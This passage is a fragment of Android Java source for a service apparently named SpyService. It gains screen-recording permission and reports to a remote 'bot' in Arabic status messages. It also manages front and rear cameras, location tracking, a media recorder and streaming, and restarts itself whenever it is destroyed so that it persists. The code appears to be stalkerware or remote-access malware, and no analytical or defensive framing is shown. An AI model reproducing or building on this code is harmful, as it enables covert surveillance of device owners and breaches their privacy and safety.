                MediaProjectionManager mpManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                mediaProjection = mpManager.getMediaProjection(resultCode, data);
                bot.sendMessage("✅ تم الحصول على صلاحية تسجيل الشاشة");
            } else {
                bot.sendMessage("❌ فشل الحصول على صلاحية تسجيل الشاشة");
            }
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (scheduler != null) scheduler.shutdown();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (camera != null) { camera.stopPreview(); camera.release(); camera = null; }
        if (frontCamera != null) { frontCamera.stopPreview(); frontCamera.release(); frontCamera = null; }
        if (isTrackingLocation && locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        if (mediaRecorder != null) { mediaRecorder.release(); mediaRecorder = null; }
        isStreaming = false;
        startService(new Intent(this, SpyService.class));
    }
}
